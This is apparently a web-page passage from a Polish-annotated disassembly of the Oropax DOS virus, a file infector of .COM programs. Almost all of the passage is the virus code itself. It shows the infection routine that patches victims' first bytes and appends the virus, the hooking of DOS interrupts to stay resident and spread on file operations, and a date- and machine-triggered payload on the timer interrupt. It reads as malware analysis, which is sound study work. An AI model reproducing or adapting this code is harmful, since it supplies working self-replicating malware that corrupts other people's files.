07A6 813E3E011DF2  CMP     WORD PTR [rozmiar_pliku],F21D ; 61891
07AC 77D1          JA      077F                          ; za díugi, FindNext

07AE BA0000        MOV     DX,0000
07B1 A13E01        MOV     AX,[rozmiar_pliku]    ; díugoûç kandydata na ofiarë
07B4 BB3300        MOV     BX,0033
07B7 F7F3          DIV     BX
07B9 83FA00        CMP     DX,+00       ; file size mod 51 = 0 ?
07BC 74C1          JZ      077F         ; szukaj nastëpnego, FindNext

07BE BFF401        MOV     DI,01F4      ; szukaj koniec nazwy
07C1 B000          MOV     AL,00
07C3 B94B00        MOV     CX,004B      ; wûr¢d 75 bajt¢w
07C6 F2            REPNZ
07C7 AE            SCASB
07C8 8A45FF        MOV     AL,[DI-01]   ; ostatni znak
07CB 3C3A          CMP     AL,3A        ; ':'
07CD 7407          JZ      07D6         ; znalazíeû nazwë dysku

07CF 3C5C          CMP     AL,5C        ; '\'
07D1 7403          JZ      07D6         ; znalazíeû nazwë katalogu

07D3 4F            DEC     DI
07D4 EBF2          JMP     07C8         ; badaj poprzedni znak

07D6 BE4201        MOV     SI,offset nazwa_pliku
07D9 E8F4FE        CALL    06D0         ; kopiuj nazwë
07DC B8023D        MOV     AX,3D02      ; open file (read/write)
07DF BAF401        MOV     DX,01F4      ; ds:adres ASCIIZ nazwy
07E2 E8F301        CALL    09D8         ; INT 21h
07E5 729F          JB      0786         ; RET

07E7 8BD8          MOV     BX,AX        ; file handle
07E9 B43F          MOV     AH,3F        ; read from file
07EB BA4F01        MOV     DX,offset bufor_kand      ; ds:bufor DTA
07EE B90400        MOV     CX,0004      ; ile bajt¢w
07F1 E8E401        CALL    09D8         ; INT 21h
07F4 7303          JAE     07F9         ; kontroluj kod pierwszej instrukcji

07F6 E9C000        JMP     08B9         ; zamykaj plik ofiary

07F9 803E4F01FF    CMP     BYTE PTR [bufor_kand],FF  ; kod  JMP  FAR
07FE 740E          JZ      080E                      ; poniechaj ten plik

0800 803E4F01E9    CMP     BYTE PTR [bufor_kand],E9  ; kod  JMP  NEAR
0805 7510          JNZ     0817                      ; atakuj

0807 803E5201F1    CMP     BYTE PTR [podpis],F1
080C 7509          JNZ     0817                      ; atakuj

080E E8A800        CALL    08B9                      ; zamykaj plik ofiary
0811 A2A801        MOV     [01A8],AL
0814 E968FF        JMP     077F                      ; FindNext

0817 A14F01        MOV     AX,[bufor_kand]           ; pierwsze dwa bajty ofiary
081A A30301        MOV     [org_4_bajty],AX
081D A15101        MOV     AX,[bufor_kand + 2]       ; pozostaíe dwa bajty
0820 A30501        MOV     [org_4_bajty + 2],AX
0823 A13E01        MOV     AX,[rozmiar_pliku]        ; przechowaj rozmiar
0826 2D0300        SUB     AX,0003
0829 C6064F01E9    MOV     BYTE PTR [bufor_kand],E9  ; kod instrukcji  JMP NEAR
082E A35001        MOV     [offset_kodu_wirusa],AX
0831 C6065201F1    MOV     BYTE PTR [podpis],F1      ; podpisz sië 
0836 B80042        MOV     AX,4200                   ; move file pointer
0839 B90000        MOV     CX,0000                   ; na poczÜtek pliku
083C BA0000        MOV     DX,0000
083F E89601        CALL    09D8                      ; INT 21h
0842 7303          JAE     0847     ; modyfikuj pierwsze cztery bajty ofiary

0844 EB73          JMP     08B9                      ; zamykaj plik ofiary
0846 90            NOP

0847 B440          MOV     AH,40                 ; write to file
0849 BA4F01        MOV     DX,offset bufor_kand  ; DS:DX adres DTA
084C B90400        MOV     CX,0004               ; ile bajt¢w
084F E88601        CALL    09D8                  ; INT 21h
0852 7303          JAE     0857

0854 EB63          JMP     08B9               ; zamykaj plik ofiary
0856 90            NOP

0857 B80242        MOV     AX,4202            ; move file pointer
085A B90000        MOV     CX,0000            ; na poczÜtek pliku
085D BA0000        MOV     DX,0000 
0860 E87501        CALL    09D8               ; INT 21h
0863 7303          JAE     0868

0865 EB52          JMP     08B9               ; zamykaj plik ofiary
0867 90            NOP

; wyznacz ostatecznÜ liczbë bajt¢w o kt¢rÜ bëdzie powiëkszony rozmiar pliku
; ostateczny rozmiar musi byç podzielny przez 51.

0868 53            PUSH    BX
0869 BA0000        MOV     DX,0000
086C A13E01        MOV     AX,[rozmiar_pliku]  ; odtwarzaj díugoûç
086F B9C40A        MOV     CX,0AC4             ; díugoûç wirusa
0872 03C1          ADD     AX,CX
0874 BB3300        MOV     BX,0033
0877 F7F3          DIV     BX
0879 83C133        ADD     CX,+33
087C 2BCA          SUB     CX,DX                ; liczba bajt¢w
087E 5B            POP     BX                   ; file handle
087F B440          MOV     AH,40                ; write to file
0881 BA0001        MOV     DX,0100              ; DS:DX adres DTA
0884 E85101        CALL    09D8                 ; INT 21h
0887 7204          JB      088D

0889 3BC1          CMP     AX,CX                ; zapis udany
088B 742C          JZ      08B9                 ; zamykaj plik ofiary

088D B80042        MOV     AX,4200              ; move file pointer
0890 B90000        MOV     CX,0000              ; na poczÜtek pliku
0893 BA0000        MOV     DX,0000
0896 E83F01        CALL    09D8                 ; INT 21h
0899 B440          MOV     AH,40                ; write to file
089B BA0301        MOV     DX,offset org_4_bajty   ; odtwarzaj 4 bajty
089E B90400        MOV     CX,0004              ; ile bajt¢w
08A1 E83401        CALL    09D8                 ; INT 21h
08A4 B80042        MOV     AX,4200              ; move file pointer
08A7 8B0E4001      MOV     CX,[0140]            ; CX:DX offset od poczÜtku
08AB 8B163E01      MOV     DX,[rozmiar_pliku]
08AF E82601        CALL    09D8                 ; INT 21h
08B2 E81000        CALL    08C5                 ; zamykaj plik ofiary
08B5 A2F401        MOV     [01F4],AL
08B8 C3            RET

08B9 B80242        MOV     AX,4202              ; move file pointer
08BC B90000        MOV     CX,0000              ; na koniec pliku
08BF BA0000        MOV     DX,0000
08C2 E81301        CALL    09D8                 ; INT 21h

08C5 8B0E3A01      MOV     CX,[czas_pliku]      ; odtwarzaj czas i datë
08C9 8B163C01      MOV     DX,[data_pliku]
08CD B80157        MOV     AX,5701              ; set file time and date
08D0 E80501        CALL    09D8                 ; INT 21h

08D3 B43E          MOV     AH,3E                ; close file
08D5 E80001        CALL    09D8                 ; INT 21h

08D8 B80143        MOV     AX,4301              ; set file attributes
08DB BAF401        MOV     DX,01F4              ; DS:adres ASCIIZ nazwy
08DE 8A0E3901      MOV     CL,[atrybut]         ; odtw¢rz atrybuty
08E2 B500          MOV     CH,00
08E4 E8F100        CALL    09D8                 ; INT 21h

08E7 B020          MOV     AL,20
08E9 8606A801      XCHG    [01A8],AL
08ED C3            RET

;--------------------------------------------------------------------------
; nowa "obsíuga" przerwania 21h
;--------------------------------------------------------------------------

08EE 9C            PUSHF
08EF 3DE033        CMP     AX,33E0     ; czy to pytanie o wirusa
08F2 7504          JNZ     08F8        ; nie, sprawd¶ o co chodzi

; potwierdzenie zainstalowania wirusa (normalnie  w AL byíoby FF)

08F4 B0E0          MOV     AL,E0       ; sygnalizacja: wirus jest zainstalowany
08F6 9D            POPF
08F7 CF            IRET

08F8 9D            POPF
08F9 9C            PUSHF
08FA 50            PUSH    AX
08FB 53            PUSH    BX
08FC 51            PUSH    CX
08FD 52            PUSH    DX
08FE 56            PUSH    SI
08FF 57            PUSH    DI
0900 55            PUSH    BP
0901 1E            PUSH    DS
0902 06            PUSH    ES

0903 80FC31        CMP     AH,31        ; stay resident
0906 743F          JZ      0947         ; instaluj wirusa jeûli trzeba

0908 80FC00        CMP     AH,00        ; terminate program
090B 7447          JZ      0954         ; instaluj wirusa jeûli trzeba

090D 80FC4C        CMP     AH,4C        ; terminate proces
0910 7442          JZ      0954         ; instaluj wirusa jeûli trzeba

0912 80FC39        CMP     AH,39        ; make dir
0915 744D          JZ      0964

0917 80FC3A        CMP     AH,3A        ; remove directory
091A 7448          JZ      0964

091C 80FC3C        CMP     AH,3C        ; create file
091F 7443          JZ      0964

0921 3D013D        CMP     AX,3D01      ; open file (tryb write only)
0924 743E          JZ      0964

0926 80FC41        CMP     AH,41        ; delete file
0929 7439          JZ      0964

092B 80FC43        CMP     AH,43        ; get/set file attribute
092E 7434          JZ      0964

0930 80FC56        CMP     AH,56        ; rename file
0933 742F          JZ      0964

0935 80FC13        CMP     AH,13        ; delete file
0938 743D          JZ      0977

093A 80FC16        CMP     AH,16        ; create file
093D 7438          JZ      0977

093F 80FC17        CMP     AH,17        ; rename file
0942 7433          JZ      0977

0944 EB22          JMP     0968         ; inna funkcja, wykonaj bez zmian
0946 90            NOP

; nowa "obsíuga" stay resident

0947 2E            CS:
0948 803E500200    CMP     BYTE PTR [L0250],00
094D 7519          JNZ     0968            ; nie przeszkadzaj

094F 8AD8          MOV     BL,AL           ; przechowaj numer funkcji
0951 EB43          JMP     0996            ; nowa wersja stay resident
0953 90            NOP

; nowa "obsíuga" procesu ko§czenia programu

0954 2E            CS:
0955 803E500200    CMP     BYTE PTR [L0250],00 ; flaga 'juß zainstalowany'
095A 750C          JNZ     0968                ; wykonaj normalnÜ obsíugë

095C BA0000        MOV     DX,0000
095F 8AD8          MOV     BL,AL
0961 EB33          JMP     0996           ; nowa wersja "stay resident"
0963 90            NOP

; obsíuga operacji na katalogach i plikach (nowe funkcje MKDIR, RMDIR, CREATE,
; OPEN, DELETE, Get/set attribute, RENAME

0964 FB            STI
0965 E8A4FD        CALL    070C          ; zakaßaj jeûli masz co

; pozostaíe funkcje przerwania INT 21h

0968 07            POP     ES
0969 1F            POP     DS
096A 5D            POP     BP
096B 5F            POP     DI
096C 5E            POP     SI
096D 5A            POP     DX
096E 59            POP     CX
096F 5B            POP     BX
0970 58            POP     AX
0971 9D            POPF
0972 2E            CS:
0973 FF2E0C01      JMP     FAR [int_21h]

; operacje na plikach (stare funkcje delete, create, rename)

0977 FB            STI
0978 E869FD        CALL    06E4
097B EBEB          JMP     0968     ; wykonaj oryginalnÜ funkcjë

;--------------------------------------------------------------------------
; nowa obsíuga przerwania INT 27h (stay resident)
;    przelicz parametry dla funkcji numer 31h INT 21h
;--------------------------------------------------------------------------

097D 83C406        ADD     SP,+06
0980 D1EA          SHR     DX,1
0982 D1EA          SHR     DX,1
0984 D1EA          SHR     DX,1
0986 D1EA          SHR     DX,1
0988 42            INC     DX
0989 8AD8          MOV     BL,AL
098B EB09          JMP     0996
098D 90            NOP

; nowa obsíuga przerwania INT 20h (zako§czenie programu)

098E 83C406        ADD     SP,+06
0991 BA0000        MOV     DX,0000
0994 B300          MOV     BL,00

; odtwarzanie starych wektor¢w przerwa§ DOS

0996 B80000        MOV     AX,0000
0999 8ED8          MOV     DS,AX

; przerwanie INT 20h

099B 2E            CS:
099C A11401        MOV     AX,[int_20h]
099F A38000        MOV     [0080],AX
09A2 2E            CS:
09A3 A11601        MOV     AX,[int_20h + 2]
09A6 A38200        MOV     [0082],AX
09A9 2E            CS:

; przerwanie 27h

09AA A11001        MOV     AX,[int_27h]
09AD A39C00        MOV     [009C],AX
09B0 2E            CS:
09B1 A11201        MOV     AX,[int_27h + 2]
09B4 A39E00        MOV     [009E],AX

09B7 2E            CS:
09B8 C606500201    MOV     BYTE PTR [L0250],01
09BD FB            STI
09BE B8C40B        MOV     AX,0BC4    ; zwiëksz obszar rezerwowany dla
09C1 D1E8          SHR     AX,1       ; rezydenta o maksymalnÜ díugoûç wirusa
09C3 D1E8          SHR     AX,1
09C5 D1E8          SHR     AX,1
09C7 D1E8          SHR     AX,1
09C9 40            INC     AX
09CA 03D0          ADD     DX,AX
09CC B80031        MOV     AX,3100    ; stay resident
09CF 8AC3          MOV     AL,BL      ; odtwarzaj numer sub funkcji
09D1 9C            PUSHF
09D2 FA            CLI
09D3 2E            CS:
09D4 FF1E0C01      CALL    FAR [int_21h]

;--------------------------------------------------------------------------
; obsíuga przerwania 21h na wíasne potrzeby wirusa
;--------------------------------------------------------------------------

09D8 9C            PUSHF
09D9 FA            CLI
09DA 2E            CS:
09DB FF1E0C01      CALL    FAR [int_21h]
09DF C3            RET

;--------------------------------------------------------------------------
; poczÜtek wykonywania kodu wirusa
;--------------------------------------------------------------------------

09E0 9C            PUSHF
09E1 50            PUSH    AX
09E2 53            PUSH    BX
09E3 51            PUSH    CX
09E4 52            PUSH    DX
09E5 56            PUSH    SI
09E6 57            PUSH    DI
09E7 55            PUSH    BP
09E8 1E            PUSH    DS
09E9 06            PUSH    ES
09EA B8E033        MOV     AX,33E0      ; test obecnoûci wirusa w systemie
09ED CD21          INT     21
09EF 3CFF          CMP     AL,FF
09F1 7423          JZ      0A16         ; wirus jeszcze nie zainstalowany

09F3 8CCE          MOV     SI,CS        ; powr¢t do oryginalnego programu (?)
09F5 8EC6          MOV     ES,SI
09F7 8B360101      MOV     SI,[0101]    ; odtworzenie oryginalnych 4 bajt¢w
09FB 81C60601      ADD     SI,0106
09FF B90400        MOV     CX,0004
0A02 BF0001        MOV     DI,0100
0A05 F3            REPZ
0A06 A4            MOVSB
0A07 07            POP     ES
0A08 1F            POP     DS
0A09 5D            POP     BP
0A0A 5F            POP     DI
0A0B 5E            POP     SI
0A0C 5A            POP     DX
0A0D 59            POP     CX
0A0E 5B            POP     BX
0A0F 58            POP     AX
0A10 9D            POPF
0A11 BD0001        MOV     BP,0100
0A14 FFE5          JMP     BP           ; skok do programu

; kontrola rozmiaru dostëpnej pamiëci

0A16 B104          MOV     CL,04        ; do dzielenia przez 16
0A18 8CC8          MOV     AX,CS
0A1A BEE30A        MOV     SI,0AE3      ; maksymalna díugoûç kodu wirusa
0A1D D3EE          SHR     SI,CL        ; przelicz na paragrafy (16 bajtowe)
0A1F 46            INC     SI
0A20 BFFFFF        MOV     DI,FFFF      ; maksymalna liczba paragraf¢w dla
0A23 D3EF          SHR     DI,CL        ; program¢w typu COM
0A25 47            INC     DI
0A26 03C6          ADD     AX,SI        ; kontrola czy wystarczy pamiëci 
0A28 03C7          ADD     AX,DI        ; operacyjnej dla wirusa
0A2A 03C7          ADD     AX,DI
0A2C 40            INC     AX
0A2D 2E            CS:
0A2E 3B060200      CMP     AX,[0002]    ; rozmiar dostëpnej pamiëci (pole PSP)
0A32 73BF          JAE     09F3         ; odpuszczaj

0A34 07            POP     ES
0A35 1F            POP     DS
0A36 5D            POP     BP
0A37 5F            POP     DI
0A38 5E            POP     SI
0A39 5A            POP     DX
0A3A 59            POP     CX
0A3B 5B            POP     BX
0A3C 58            POP     AX
0A3D 9D            POPF
0A3E 8BE8          MOV     BP,AX
0A40 E9E600        JMP     0B29         ; przesuwaj kod wirusa w pamiëci

; kontynuacja instalacji wirusa

0A43 8BC5          MOV     AX,BP
0A45 2E            CS:
0A46 8E160A01      MOV     SS,[010A]    ; odtwarzaj rejestry segmentowe
0A4A BC0000        MOV     SP,0000
0A4D 2E            CS:
0A4E 8E1E0A01      MOV     DS,[010A]
0A52 2E            CS:
0A53 8E060A01      MOV     ES,[010A]
0A57 BD0000        MOV     BP,0000
0A5A 55            PUSH    BP
0A5B 9C            PUSHF
0A5C 50            PUSH    AX
0A5D 53            PUSH    BX
0A5E 51            PUSH    CX
0A5F 52            PUSH    DX
0A60 56            PUSH    SI
0A61 57            PUSH    DI
0A62 55            PUSH    BP
0A63 1E            PUSH    DS
0A64 06            PUSH    ES

; odczyt aktualnych wektor¢w przerwa§

0A65 FB            STI
0A66 B80000        MOV     AX,0000
0A69 8ED8          MOV     DS,AX

; przerwanie INT 20h

0A6B C43E8000      LES     DI,[0080]
0A6F 2E            CS:
0A70 893E1401      MOV     [int_20h],DI
0A74 2E            CS:
0A75 8C061601      MOV     [int_20h + 2],ES

; przerwanie INT 8h (zegarowe)

0A79 C43E2000      LES     DI,[0020]
0A7D 2E            CS:
0A7E 893E1C01      MOV     [int_08h],DI
0A82 2E            CS:
0A83 8C061E01      MOV     [int_08h + 2],ES

; przerwanie INT 21h

0A87 C43E8400      LES     DI,[0084]
0A8B 2E            CS:
0A8C 893E0C01      MOV     [int_21h],DI
0A90 2E            CS:
0A91 8C060E01      MOV     [int_21h + 2],ES

; przerwanie INT 27h

0A95 C43E9C00      LES     DI,[009C]
0A99 2E            CS:
0A9A 893E1001      MOV     [int_27h],DI
0A9E 2E            CS:
0A9F 8C061201      MOV     [int_27h + 2],ES
0AA3 FA            CLI

AX=0000  BX=3306  CX=0000  DX=2AEC  SP=FFEA  BP=0000  SI=0107  DI=6366
DS=0000  ES=022B  SS=27CA  CS=270D  IP=0AA4   NV UP DI PL NZ AC PE NC
 WR DS:0080 = 143F

; podmiana wektora INT 20h (program terminate)

0AA4 C70680008E09  MOV     WORD PTR [0080],098E

             ; sygnatura dla OROPAX/2 staruje w 0AACh

0AAA 8C0E8200      MOV     [0082],CS

; podmiana wektora 27h     (terminate but stay resident)

0AAE C7069C007D09  MOV     WORD PTR [009C],097D
0AB4 8C0E9E00      MOV     [009E],CS

; podmiana wektora 21h

0AB8 C7068400EE08  MOV     WORD PTR [0084],08EE
0ABE 8C0E8600      MOV     [0086],CS

0AC2 FB            STI
0AC3 2E            CS:
0AC4 803E070100    CMP     BYTE PTR [L0107],00
0AC9 744C          JZ      0B17         ; wracaj do wíaûciwego programu

0ACB B42A          MOV     AH,2A        ; Get Date
0ACD CD21          INT     21
0ACF 81F9C307      CMP     CX,07C3      ; 1987
0AD3 720A          JB      0ADF         ; data wczeûniejsza

0AD5 7710          JA      0AE7         ; data p¢¶niejsza

0AD7 81FA0105      CMP     DX,0501      ; 1 maja 1987
0ADB 730A          JAE     0AE7         ; data p¢¶niejsza lub r¢wna

0ADD EB38          JMP     0B17         ; data wczeûniejsza

0ADF 2E            CS:
0AE0 803E070102    CMP     BYTE PTR [L0107],02
0AE5 7230          JB      0B17         ; powr¢t do wíaûciwego programu

0AE7 1E            PUSH    DS           ; sprawd¶ identyfikator modelu w ROM
0AE8 B8FFFF        MOV     AX,FFFF
0AEB 8ED8          MOV     DS,AX
0AED A00E00        MOV     AL,[000E]    ; system ID byte
0AF0 24FC          AND     AL,FC
0AF2 3CFC          CMP     AL,FC        ; AT
0AF4 1F            POP     DS
0AF5 7520          JNZ     0B17         ; nie AT, wracaj do programu

; generowanie liczby losowej 0 .. 3

0AF7 A16C04        MOV     AX,[046C]    ; timer counter {?}
0AFA 03066E04      ADD     AX,[046E]
0AFE 35AA55        XOR     AX,55AA
0B01 D3C9          ROR     CX,CL
0B03 03C1          ADD     AX,CX
0B05 2403          AND     AL,03
0B07 3C00          CMP     AL,00
0B09 750C          JNZ     0B17         ; wracaj do programu

; adres nowej obsíugi INT 8 (zegarowe)

0B0B FA            CLI
0B0C C70620007A06  MOV     WORD PTR [0020],067A
0B12 8C0E2200      MOV     [0022],CS
0B16 FB            STI

; wyjûcie z wirusa i powr¢t do wíaûciwego programu 

0B17 E896FB        CALL    06B0         ; inicjuj staíe robocze wirusa do
0B1A 07            POP     ES           ; muzykowania
0B1B 1F            POP     DS
0B1C 5D            POP     BP
0B1D 5F            POP     DI
0B1E 5E            POP     SI
0B1F 5A            POP     DX
0B20 59            POP     CX
0B21 5B            POP     BX
0B22 58            POP     AX
0B23 9D            POPF
0B24 2E            CS:
0B25 FF2E0801      JMP     FAR [L0108]   ; skok do wíaûciwego programu (?)

0B29 8CC8          MOV     AX,CS         ; inicjuj DE, ES
0B2B 8ED8          MOV     DS,AX
0B2D 8EC0          MOV     ES,AX
0B2F 8B1E0101      MOV     BX,[0101]     ; offset kodu wirusa
0B33 81C30301      ADD     BX,offset org_4_bajty
0B37 8CC8          MOV     AX,CS
0B39 BEE30A        MOV     SI,0AE3       ; díugoûç kodu wirusa
0B3C 03F3          ADD     SI,BX
0B3E D1EE          SHR     SI,1          ; przelicz na paragrafy (16 bajtowe)
0B40 D1EE          SHR     SI,1
0B42 D1EE          SHR     SI,1
0B44 D1EE          SHR     SI,1
0B46 46            INC     SI
0B47 03C6          ADD     AX,SI         ; wyznacz adresy pod kt¢re przesuniesz
0B49 8BD0          MOV     DX,AX         ; kod programu by zrobiç miejsce dla
0B4B 8ED2          MOV     SS,DX         ; miejsce dla wirusa, kt¢ry po 
0B4D BCFEFF        MOV     SP,FFFE       ; zako§czeniu wykonywania kodu 
0B50 B91F00        MOV     CX,001F       ; nosiciela zostanie rezydentnie
0B53 8BF3          MOV     SI,BX         ; w pamiëci
0B55 8BFB          MOV     DI,BX
0B57 81C7C40A      ADD     DI,0AC4
0B5B 81C6A50A      ADD     SI,0AA5
0B5F FC            CLD
0B60 F3            REPZ                  ; przsu§ caíy kod
0B61 A4            MOVSB
0B62 8BC3          MOV     AX,BX         ; wyznacz nowy adres poíoßenia kodu
0B64 05C40A        ADD     AX,0AC4       ; wirusa (w tym listingu 0BA5h ?)
0B67 FFE0          JMP     AX            ; skok do przemieszczonego kodu 

;

0B69 8CC8          MOV     AX,CS
0B6B BEC40B        MOV     SI,0BC4
0B6E D1EE          SHR     SI,1
0B70 D1EE          SHR     SI,1
0B72 D1EE          SHR     SI,1
0B74 D1EE          SHR     SI,1
0B76 46            INC     SI
0B77 03C6          ADD     AX,SI
0B79 8EC0          MOV     ES,AX
0B7B 8EDA          MOV     DS,DX
0B7D BE0000        MOV     SI,0000
0B80 BF0000        MOV     DI,0000
0B83 8BCB          MOV     CX,BX
0B85 F3            REPZ
0B86 A4            MOVSB
0B87 8CC8          MOV     AX,CS
0B89 8ED8          MOV     DS,AX
0B8B BE0301        MOV     SI,offset org_4_bajty
0B8E BF0001        MOV     DI,0100
0B91 B90400        MOV     CX,0004
0B94 F3            REPZ
0B95 A4            MOVSB

; buduj adres startowy nosiciela w L0108

0B96 2E            CS:
0B97 C70608010001  MOV     WORD PTR [L0108],0100
0B9D 2E            CS:
0B9E 8C060A01      MOV     [L0108 + 2],ES
0BA2 E99EFE        JMP     0A43             ; id¶ modyfikowaç wektory przerwa§

0BA5 8EC2          MOV     ES,DX
0BA7 BE0000        MOV     SI,0000
0BAA BF0000        MOV     DI,0000
0BAD 8BCB          MOV     CX,BX
0BAF F3            REPZ
0BB0 A4            MOVSB
0BB1 8CCF          MOV     DI,CS
0BB3 8EC7          MOV     ES,DI
0BB5 BF0001        MOV     DI,0100
0BB8 8BF3          MOV     SI,BX
0BBA B9C40A        MOV     CX,0AC4
0BBD F3            REPZ
0BBE A4            MOVSB
0BBF B8690B        MOV     AX,0B69
0BC2 FFE0          JMP     AX

; trochë ûmieci i za nimi (od BD0) PSP zaraßonego programu


</textarea></td></tr></table></body></html>
